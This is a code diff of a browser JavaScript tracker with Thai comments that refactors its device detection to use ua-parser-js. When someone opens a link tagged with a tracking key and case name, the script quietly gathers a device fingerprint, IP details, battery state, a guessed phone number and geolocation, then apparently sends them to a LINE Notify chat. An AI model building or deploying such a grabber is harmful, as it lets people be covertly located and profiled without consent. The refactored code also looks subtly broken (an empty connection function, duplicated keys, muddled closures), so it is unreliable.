@@ -39,21 +39,54 @@ function getUrlParameters() {
   const { trackingKey, caseName } = getUrlParameters();
 
   // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
-  const deviceInfo = getDetailedDeviceInfo();
+  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ (deviceInfo will be fetched asynchronously)
   const screenSize = `${window.screen.width}x${window.screen.height}`;
   const screenColorDepth = window.screen.colorDepth;
   const devicePixelRatio = window.devicePixelRatio || 1;
   const referrer = document.referrer || "ไม่มีข้อมูล";
   const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
-  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
+  // platform will be part of deviceInfo
   const connection = getConnectionInfo();
   const browser = detectBrowser();
 
-  // ตรวจสอบการใช้งานแบตเตอรี่
-  getBatteryInfo().then(batteryData => {
+// Function to load a script dynamically
+function loadScript(url) {
+  return new Promise((resolve, reject) => {
+    const script = document.createElement('script');
+    script.src = url;
+    script.async = true;
+    script.onload = () => {
+      console.log(`Script loaded successfully: ${url}`);
+      resolve();
+    };
+    script.onerror = (error) => {
+      console.error(`Failed to load script: ${url}`, error);
+      reject(new Error(`Failed to load script: ${url}`));
+    };
+    document.body.appendChild(script);
+  });
+}
+
+  // Wrap the main logic in an async function to await library and device info
+  (async () => {
+    try {
+      // Load ua-parser-js library first
+      await loadScript('https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js');
+    } catch (error) {
+      console.error("Could not load ua-parser-js. Device detection might be inaccurate.", error);
+      // Optionally, you could proceed with less accurate methods or stop here
+      // For now, we'll let getDetailedDeviceInfo handle the missing library
+    }
+
+    const deviceInfo = await getDetailedDeviceInfo(); // Fetch device info (now uses UAParser)
+    const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล"; // Get platform after fetching
+
+    // ตรวจสอบการใช้งานแบตเตอรี่
+    const batteryData = await getBatteryInfo(); // Await battery info as well
+
     // รวบรวมข้อมูลทั้งหมด
     const allDeviceData = {
-      ...deviceInfo,
+      ...deviceInfo, // Spread the fetched device info
       screenSize,
       screenColorDepth,
       devicePixelRatio,
@@ -61,37 +94,38 @@ function getUrlParameters() {
       platform,
       browser,
       connection,
-      battery: batteryData
+      battery: batteryData,
+      platform // Include platform derived from deviceInfo
     };
 
     // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
     let dataToSend = {};
-    
+
     // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
-    Promise.all([
-      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
+    const [ipData, phoneInfo] = await Promise.all([
+      getIPDetails().catch(error => ({ ip: "ไม่สามารถระบุได้" })),
       estimatePhoneNumber().catch(() => null)
-    ])
-    .then(([ipData, phoneInfo]) => {
-      // เก็บข้อมูลที่จำเป็นทั้งหมด
-      dataToSend = {
-        timestamp: timestamp,
-        ip: ipData,
-        deviceInfo: allDeviceData,
-        phoneInfo: phoneInfo,
-        referrer: referrer,
-        trackingKey: trackingKey || "ไม่มีค่า",
-        caseName: caseName || "ไม่มีค่า",
-        useServerMessage: true,
-        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
-      };
-      
-      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
-      if (navigator.geolocation) {
-        const locationPromise = new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            position => {
-              resolve({
+    ]);
+
+    // เก็บข้อมูลที่จำเป็นทั้งหมด
+    dataToSend = {
+      timestamp: timestamp,
+      ip: ipData,
+      deviceInfo: allDeviceData,
+      phoneInfo: phoneInfo,
+      referrer: referrer,
+      trackingKey: trackingKey || "ไม่มีค่า",
+      caseName: caseName || "ไม่มีค่า",
+      useServerMessage: true,
+      requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
+    };
+
+    // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
+    if (navigator.geolocation) {
+      const locationPromise = new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            resolve({
                 lat: position.coords.latitude,
                 long: position.coords.longitude,
                 accuracy: position.coords.accuracy,
@@ -126,328 +160,119 @@ function getUrlParameters() {
         dataToSend.location = "ไม่มีข้อมูล";
         sendToLineNotify(dataToSend);
       }
-    });
-  });
-})();
+    } // End async IIFE
+  )();
+})(); // <-- Add closing for the outer IIFE here
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
   return Date.now().toString(36) + Math.random().toString(36).substr(2);
 }
 
-// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
-function getDetailedDeviceInfo() {
+// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด (ใช้ ua-parser-js)
+async function getDetailedDeviceInfo() {
   const userAgent = navigator.userAgent;
-  const vendor = navigator.vendor || "ไม่มีข้อมูล";
-  
-  // ตัวแปรสำหรับเก็บข้อมูลละเอียด
-  let deviceType = "คอมพิวเตอร์"; // ค่าเริ่มต้น
-  let deviceModel = "ไม่สามารถระบุได้";
-  let osInfo = "ไม่สามารถระบุได้";
-  let deviceBrand = "ไม่สามารถระบุได้";
-  
-  // ตรวจจับ iPad อย่างถูกต้อง
-  const isIPad = detectIPad();
-  
-  // ตรวจจับ Device Type
-  if (isIPad) {
-    deviceType = "แท็บเล็ต";
-    deviceBrand = "Apple";
-    deviceModel = getIPadModel(userAgent);
-  } else if (/iPhone|iPod/.test(userAgent)) {
-    deviceType = "มือถือ";
-    deviceBrand = "Apple";
-    deviceModel = getIPhoneModel(userAgent);
-  } else if (/android/i.test(userAgent)) {
-    // แยกระหว่างแท็บเล็ตและมือถือ Android
-    if (/tablet|SM-T|Tab/i.test(userAgent) || (!/Mobile/i.test(userAgent) && Math.max(window.screen.width, window.screen.height) > 1000)) {
-      deviceType = "แท็บเล็ต";
-    } else {
-      deviceType = "มือถือ";
-    }
-    
-    // ดึงข้อมูลยี่ห้อและรุ่น Android
-    const androidInfo = getAndroidInfo(userAgent);
-    deviceBrand = androidInfo.brand;
-    deviceModel = androidInfo.model;
-    osInfo = androidInfo.osVersion;
-  } else {
-    // ตรวจจับ Desktop OS
-    if (/Windows/.test(userAgent)) {
-      deviceBrand = "PC";
-      osInfo = getWindowsVersion(userAgent);
-      deviceModel = `Windows ${osInfo}`;
-    } else if (/Mac OS X/.test(userAgent)) {
-      deviceBrand = "Apple";
-      osInfo = getMacOSVersion(userAgent);
-      deviceModel = `Mac ${osInfo}`;
-    } else if (/Linux/.test(userAgent)) {
-      deviceBrand = "PC";
-      deviceModel = "Linux";
-      if (/Ubuntu/.test(userAgent)) {
-        deviceModel = "Ubuntu Linux";
-      } else if (/Fedora/.test(userAgent)) {
-        deviceModel = "Fedora Linux";
-      }
-    } else if (/CrOS/.test(userAgent)) {
-      deviceBrand = "Google";
-      deviceModel = "Chromebook";
-      deviceType = "โน้ตบุ๊ค";
-    }
-  }
-  
-  // อัพเดทข้อมูล OS สำหรับอุปกรณ์ Apple ถ้ายังไม่ได้กำหนด
-  if (deviceBrand === "Apple" && osInfo === "ไม่สามารถระบุได้") {
-    if (isIPad || /iPhone|iPod/.test(userAgent)) {
-      osInfo = getIOSVersion(userAgent);
-    } else if (/Mac OS X/.test(userAgent)) {
-      osInfo = getMacOSVersion(userAgent);
-    }
-  }
-  
-  return {
+  const vendor = navigator.vendor || "ไม่มีข้อมูล"; // Keep original vendor if needed
+
+  // Default values
+  let deviceInfo = {
     userAgent: userAgent,
     vendor: vendor,
-    deviceType: deviceType,
-    deviceModel: deviceModel,
-    osInfo: osInfo,
-    deviceBrand: deviceBrand
+    deviceType: "ไม่สามารถระบุได้",
+    deviceModel: "ไม่สามารถระบุได้",
+    osInfo: "ไม่สามารถระบุได้",
+    deviceBrand: "ไม่สามารถระบุได้",
+    source: "Error" // Source of the data
   };
-}
 
-// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ (ป้องกันปัญหา iPadOS แสดงเป็น Mac)
-function detectIPad() {
-  const ua = navigator.userAgent;
-  
-  // วิธีการตรวจจับ iPad ที่แม่นยำมากขึ้น:
-  // 1. ตรวจสอบ User Agent แบบดั้งเดิมก่อน
-  if (/iPad/.test(ua)) {
-    return true;
+  // Check if UAParser library is loaded
+  if (typeof window.UAParser !== 'function') {
+    console.error("UAParser library not loaded. Cannot get detailed device info.");
+    deviceInfo.source = "LibraryLoadFailed";
+    return deviceInfo;
   }
-  
-  // 2. สำหรับ iPadOS 13+ ที่แสดงเป็น Mac Safari
-  // ตรวจสอบว่าเป็น Mac + มี Touch Support + ไม่มีตัวแปรเฉพาะของ Mac
-  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) {
-    // iPad รุ่นใหม่ใช้ iPadOS 13+ จะปลอมตัวเป็น macOS
-    return true;
-  }
-  
-  // 3. ตรวจสอบขนาดหน้าจอ สำหรับกรณีที่ไม่สามารถตรวจจับได้ด้วยวิธีอื่น
-  // iPad ทุกรุ่นมีอัตราส่วนจอที่เฉพาะและขนาดจอมักจะใหญ่กว่า iPhone
-  if (/Apple/.test(navigator.vendor) && 
-      /Mobile/.test(ua) && 
-      !(/iPhone|iPod/.test(ua)) && 
-      window.screen.width >= 768 && 
-      window.screen.height >= 768) {
-    return true;
-  }
-  
-  return false;
-}
 
-// ฟังก์ชันดึงข้อมูลรุ่น iPad
-function getIPadModel(ua) {
-  // ตรวจสอบรุ่น iPad จาก Build ID ใน User Agent
-  let model = "iPad";
-  const iosVersion = getIOSVersion(ua);
-  
-  // ตรวจสอบ CPU/Chip สำหรับรุ่นใหม่
-  if (/CPU OS 1[5-9]/.test(ua)) {
-    model += " (Apple Silicon)";
-  }
-  
-  // แยกแยะรุ่นตาม iPad identifier ใน UA ถ้ามี
-  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
-  if (modelMatch) {
-    // Match iPad model identifiers with actual models
-    const modelIdentifier = modelMatch[1];
-    switch (modelIdentifier) {
-      case "13,1": case "13,2": model = "iPad Air (4th gen)"; break;
-      case "13,4": case "13,5": case "13,6": case "13,7": model = "iPad Pro 11\" (3rd gen)"; break;
-      case "13,8": case "13,9": case "13,10": case "13,11": model = "iPad Pro 12.9\" (5th gen)"; break;
-      case "14,1": model = "iPad Pro 11\" (4th gen)"; break;
-      case "14,2": model = "iPad Pro 12.9\" (6th gen)"; break;
-      case "14,3": case "14,4": model = "iPad Air (5th gen)"; break;
-      // เพิ่มรายการอื่นๆ ตามต้องการ
-    }
-  } else {
-    // ถ้าไม่พบ identifier พยายามวิเคราะห์จาก OS version และขนาดจอ
-    const screenSize = Math.max(window.screen.width, window.screen.height);
-    if (screenSize >= 1024) {
-      model += " Pro";
-      if (screenSize >= 1366) {
-        model += " 12.9\"";
+  try {
+    const parser = new UAParser(userAgent);
+    const result = parser.getResult();
+
+    console.log("UAParser Result:", result);
+
+    // Map UAParser results to our structure
+    const device = result.device || {};
+    const os = result.os || {};
+
+    // Determine Device Type (more specific than ua-parser's default)
+    let type = device.type; // e.g., 'mobile', 'tablet', 'console', 'smarttv'
+    if (!type) {
+      // If type is missing, infer from OS or UA
+      if (os.name === 'Windows' || os.name === 'Mac OS' || os.name === 'Linux') {
+        type = 'คอมพิวเตอร์';
+      } else if (os.name === 'Android' || os.name === 'iOS') {
+        // Could be mobile or tablet, check UA further if needed
+        if (/(Tablet|Tab|iPad|SM-T)/i.test(userAgent)) {
+          type = 'แท็บเล็ต';
+        } else {
+          type = 'มือถือ';
+        }
       } else {
-        model += " 11\"";
+        type = 'คอมพิวเตอร์'; // Default fallback
       }
-    } else if (screenSize >= 834) {
-      model += " Air/Pro 10.5\"";
     } else {
-      model += "/mini";
-    }
-  }
-  
-  return `${model} (iOS ${iosVersion})`;
-}
-
-// ฟังก์ชันดึงข้อมูลรุ่น iPhone
-function getIPhoneModel(ua) {
-  let model = "iPhone";
-  const iosVersion = getIOSVersion(ua);
-  
-  // ตรวจสอบรุ่น iPhone จาก User Agent
-  if (/iPhone([0-9]+,[0-9]+)/.test(ua)) {
-    const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
-    const modelIdentifier = modelMatch[1];
-    // Match iPhone model identifiers with actual models
-    switch (modelIdentifier) {
-      case "15,4": case "15,5": model = "iPhone 14 Pro"; break;
-      case "15,2": case "15,3": model = "iPhone 14 Pro Max"; break;
-      case "14,7": model = "iPhone 14"; break;
-      case "14,8": model = "iPhone 14 Plus"; break;
-      case "13,1": model = "iPhone 12 mini"; break;
-      case "13,2": model = "iPhone 12"; break;
-      case "13,3": model = "iPhone 12 Pro"; break;
-      case "13,4": model = "iPhone 12 Pro Max"; break;
-      // เพิ่มรายการอื่นๆ ตามต้องการ
-      default: model = `iPhone (Model ID: ${modelIdentifier})`;
-    }
-  }
-  
-  return `${model} (iOS ${iosVersion})`;
-}
-
-// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
-function getAndroidInfo(ua) {
-  let brand = "Android";
-  let model = "ไม่ทราบรุ่น";
-  let osVersion = "ไม่ทราบเวอร์ชัน";
-  
-  // ดึงเวอร์ชัน Android
-  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
-  if (androidVersionMatch) {
-    osVersion = androidVersionMatch[1];
-  }
-  
-  // ตรวจสอบยี่ห้อและรุ่น
-  if (/Samsung|SM-|Galaxy/.test(ua)) {
-    brand = "Samsung";
-    const samsungModelMatch = ua.match(/SM-[A-Z0-9]+/i) || ua.match(/Galaxy\s[A-Z0-9\s]+/i);
-    if (samsungModelMatch) {
-      model = samsungModelMatch[0];
-      // แปลรหัสรุ่นให้เป็นชื่อรุ่นที่คนทั่วไปรู้จัก
-      if (model.startsWith("SM-")) {
-        if (model.startsWith("SM-G") || model.startsWith("SM-N")) {
-          if (model.startsWith("SM-G99")) model = "Galaxy S23 series";
-          else if (model.startsWith("SM-G98")) model = "Galaxy S21 series";
-          else if (model.startsWith("SM-G97")) model = "Galaxy S10 series";
-          else if (model.startsWith("SM-N9")) model = "Galaxy Note series";
-        } else if (model.startsWith("SM-A")) {
-          model = "Galaxy A series";
-        } else if (model.startsWith("SM-T")) {
-          model = "Galaxy Tab series";
-        }
+      // Translate ua-parser types
+      switch(type) {
+        case 'mobile': type = 'มือถือ'; break;
+        case 'tablet': type = 'แท็บเล็ต'; break;
+        case 'smarttv': type = 'สมาร์ททีวี'; break;
+        case 'console': type = 'คอนโซลเกม'; break;
+        case 'wearable': type = 'อุปกรณ์สวมใส่'; break;
+        default: type = type; // Keep original if unknown
       }
     }
-  } else if (/MI |Redmi|POCO/.test(ua)) {
-    brand = "Xiaomi";
-    const xiaomiModelMatch = ua.match(/MI\s[A-Z0-9]+|Redmi\s[A-Z0-9]+|POCO\s[A-Z0-9]+/i);
-    if (xiaomiModelMatch) {
-      model = xiaomiModelMatch[0];
+
+
+    deviceInfo.deviceType = type;
+    deviceInfo.deviceBrand = device.vendor || "ไม่สามารถระบุได้"; // e.g., 'Apple', 'Samsung'
+    deviceInfo.deviceModel = device.model || "ไม่สามารถระบุได้"; // e.g., 'iPhone', 'SM-G998B'
+    deviceInfo.osInfo = `${os.name || ''} ${os.version || ''}`.trim() || "ไม่สามารถระบุได้"; // e.g., 'iOS 15.4', 'Android 12'
+    deviceInfo.source = "UAParserJS";
+
+    // Refine model for common cases if needed (optional)
+    if (deviceInfo.deviceBrand === 'Apple' && deviceInfo.deviceModel === 'iPhone' && os.version) {
+       // ua-parser might not give the specific iPhone model (e.g., 14 Pro)
+       // We could try to map os.version or screen size here, but it's less reliable than the library's primary data
+       console.log("Note: ua-parser-js might provide generic 'iPhone' model.");
     }
-  } else if (/HUAWEI|HONOR/.test(ua)) {
-    brand = /HONOR/.test(ua) ? "HONOR" : "HUAWEI";
-    const huaweiModelMatch = ua.match(/HUAWEI\s[A-Z0-9\-]+|HONOR\s[A-Z0-9]+/i);
-    if (huaweiModelMatch) {
-      model = huaweiModelMatch[0];
+     if (deviceInfo.deviceBrand === 'Apple' && deviceInfo.deviceModel === 'iPad' && os.version) {
+       console.log("Note: ua-parser-js might provide generic 'iPad' model.");
     }
-  } else if (/OPPO|CPH[0-9]+/.test(ua)) {
-    brand = "OPPO";
-    const oppoModelMatch = ua.match(/OPPO\s[A-Z0-9]+|CPH[0-9]+/i);
-    if (oppoModelMatch) {
-      model = oppoModelMatch[0];
-    }
-  } else if (/vivo/.test(ua)) {
-    brand = "vivo";
-    const vivoModelMatch = ua.match(/vivo\s[A-Z0-9]+/i);
-    if (vivoModelMatch) {
-      model = vivoModelMatch[0];
-    }
-  } else if (/ONEPLUS/.test(ua)) {
-    brand = "OnePlus";
-    const oneplusModelMatch = ua.match(/ONEPLUS\s[A-Z0-9]+/i);
-    if (oneplusModelMatch) {
-      model = oneplusModelMatch[0];
-    }
-  } else if (/Google|Pixel/.test(ua)) {
-    brand = "Google";
-    const pixelModelMatch = ua.match(/Pixel\s[0-9]+/i);
-    if (pixelModelMatch) {
-      model = pixelModelMatch[0];
-    }
-  } else {
-    // ถ้าไม่พบยี่ห้อที่รู้จัก พยายามดึงจาก Build info
-    const genericModelMatch = ua.match(/;\s([^;]+)\sBuild\//i) || ua.match(/;\s([^;]+)\)/i);
-    if (genericModelMatch) {
-      model = genericModelMatch[1].trim();
-      
-      // พยายามแยกยี่ห้อจากรุ่น
-      const brandParts = model.split(' ');
-      if (brandParts.length > 1) {
-        const possibleBrand = brandParts[0].toLowerCase();
-        if (!(/[0-9]/.test(possibleBrand))) {  // ถ้าไม่มีตัวเลขในชื่อยี่ห้อ
-          brand = brandParts[0];
-          model = model.substring(brand.length).trim();
-        }
-      }
-    }
+
+
+  } catch (error) {
+    console.error("Error using UAParser:", error);
+    deviceInfo.source = "UAParserError";
   }
-  
-  return {
-    brand: brand,
-    model: model,
-    osVersion: `Android ${osVersion}`
-  };
+
+  return deviceInfo;
 }
 
-// ฟังก์ชันดึงเวอร์ชัน iOS
-function getIOSVersion(ua) {
-  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i) || ua.match(/Version\/(\d+\.\d+)/i);
-  if (match) {
-    return match[1].replace(/_/g, '.');
-  }
-  return "ไม่ทราบเวอร์ชัน";
-}
 
-// ฟังก์ชันดึงเวอร์ชัน macOS
-function getMacOSVersion(ua) {
-  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
-  if (match) {
-    const version = match[1].replace(/_/g, '.');
-    
-    // แปลงเวอร์ชันตัวเลขเป็นชื่อ
-    if (version.startsWith('14')) return "Sonoma";
-    else if (version.startsWith('13')) return "Ventura";
-    else if (version.startsWith('12')) return "Monterey";
-    else if (version.startsWith('11')) return "Big Sur";
-    else if (version.startsWith('10.15')) return "Catalina";
-    else if (version.startsWith('10.14')) return "Mojave";
-    else if (version.startsWith('10.13')) return "High Sierra";
-    else return `macOS ${version}`;
-  }
-  return "macOS";
-}
+// --- ฟังก์ชันที่ไม่จำเป็นแล้วเมื่อใช้ ua-parser-js ---
+/*
+function getWindowsVersionFromPlatformVersion(version) { ... }
+function getMacOSVersionFromPlatformVersion(version) { ... }
+function detectIPad() { ... }
+function getIPadModel(ua) { ... }
+function getIPhoneModel(ua) { ... }
+function getAndroidInfo(ua) { ... }
+function getIOSVersion(ua) { ... }
+function getMacOSVersion(ua) { ... }
+function getWindowsVersion(ua) { ... }
+*/
 
-// ฟังก์ชันดึงเวอร์ชัน Windows
-function getWindowsVersion(ua) {
-  if (/Windows NT 10.0/.test(ua)) return "11/10";
-  else if (/Windows NT 6.3/.test(ua)) return "8.1";
-  else if (/Windows NT 6.2/.test(ua)) return "8";
-  else if (/Windows NT 6.1/.test(ua)) return "7";
-  else if (/Windows NT 6.0/.test(ua)) return "Vista";
-  else if (/Windows NT 5.1/.test(ua)) return "XP";
-  else if (/Windows NT/.test(ua)) return "NT";
-  else return "";
+// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด (ยังคงเดิม)
+function getConnectionInfo() {
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 }
 
 // ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
